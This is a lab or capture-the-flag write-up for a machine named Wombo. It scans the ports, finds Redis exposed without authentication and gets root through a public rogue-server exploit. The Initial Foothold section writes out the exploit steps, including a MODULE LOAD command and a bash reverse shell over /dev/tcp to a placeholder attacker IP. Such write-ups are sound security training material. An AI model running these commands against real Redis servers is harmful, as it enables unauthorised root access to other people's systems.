---
icon: linux
---

# Wombo

## Summary

* Discovered multiple open ports including Redis, MongoDB, and a NodeBB instance.
* Redis (port 6379) was exposed and vulnerable to rogue server attack.
* Used a public exploit to achieve **unauthenticated RCE as root** via Redis.
* Gained a root shell directly without requiring privilege escalation.





## 🧵 Let's Unpack

**Enumeration**

```bash
sudo nmap -sV -sC -p- -Pn 192.168.229.69 --open
```

Open Ports:

* `22/tcp` → OpenSSH 7.4p1 Debian
* `80/tcp` → nginx 1.10.3 (default page)
* `6379/tcp` → Redis 5.0.9
* `8080/tcp` → NodeBB forum interface
* `27017/tcp` → MongoDB 4.0.18 (requires auth)

📌 **Interesting Findings**:

* Redis port **open to the world** with **no authentication required**
* NodeBB and MongoDB are red herrings (rabbit holes)

***

**Initial Foothold**

**🎯 Target: Redis (port 6379)**

* Exploited with [`redis-rogue-server`](https://github.com/n0b0dyCN/redis-rogue-server)
  * [https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)

```bash
# Clone and execute exploit to load malicious module via Redis protocol
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server

# Configure rogue server with malicious .so file
python3 rogue_server.py

# On target Redis host
redis-cli -h <victim-ip> -p 6379
> MODULE LOAD ./exp.so
> SYSTEM /bin/bash -c "bash -i >& /dev/tcp/<your-ip>/<port> 0>&1"
```

* 🪝 **Reverse shell received with root privileges**

***

**Privilege Escalation**

❌ _Not required._

Redis exploit gave **direct root access**, eliminating the need for additional privilege escalation steps.

